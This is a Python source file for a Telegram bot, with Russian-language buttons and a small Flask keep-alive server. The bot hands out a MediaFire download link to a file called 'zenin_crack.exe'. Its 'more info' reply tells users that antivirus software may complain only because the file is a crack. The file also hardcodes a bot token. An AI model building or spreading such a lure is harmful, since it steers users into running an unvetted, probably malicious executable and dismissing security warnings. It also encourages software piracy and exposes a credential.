import os
import threading
import time
from flask import Flask
import telebot
from telebot import types

TOKEN = "8773898221:AAGy67kpPvmxiHWCMagPdljvKWWX9fxz-FI"
SOFT_LINK = "https://www.mediafire.com/file/aulm7t7mu6388sc/zenin_crack.exe/file"
IMAGE_URL = "https://i.ibb.co/your-image.jpg"

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# Словарь для хранения времени последнего запроса пользователя
user_last_use = {}

@bot.message_handler(commands=['start'])
def start(message):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    button1 = types.InlineKeyboardButton("📥 Скачать софт", callback_data="download")
    button2 = types.InlineKeyboardButton("🎯 Подробнее", callback_data="more")
    keyboard.add(button1, button2)
    
    bot.send_message(message.chat.id, "ВЫБИРАЙТЕ СОФТ", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    user_id = call.from_user.id
    current_time = time.time()
    
    # Проверяем КД 5 секунд
    if user_id in user_last_use:
        time_passed = current_time - user_last_use[user_id]
        if time_passed < 5:
            remaining = int(5 - time_passed)
            bot.answer_callback_query(
                call.id, 
                f"⏳ Подожди {remaining} сек!",
                show_alert=False
            )
            return
    
    # Обновляем время
    user_last_use[user_id] = current_time
    
    # Обработка кнопок
    if call.data == "download":
        bot.send_message(call.message.chat.id, f"🔗 Ссылка:\n{SOFT_LINK}")
    
    elif call.data == "more":
        bot.send_photo(call.message.chat.id, IMAGE_URL, caption="☢️ антивирус может ругаться на софт потому что это кряк ☢️")
    
    bot.answer_callback_query(call.id)

@app.route('/')
def index():
    return "Bot is running!"

def run_bot():
    bot.infinity_polling()

if __name__ == "__main__":
    threading.Thread(target=run_bot).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
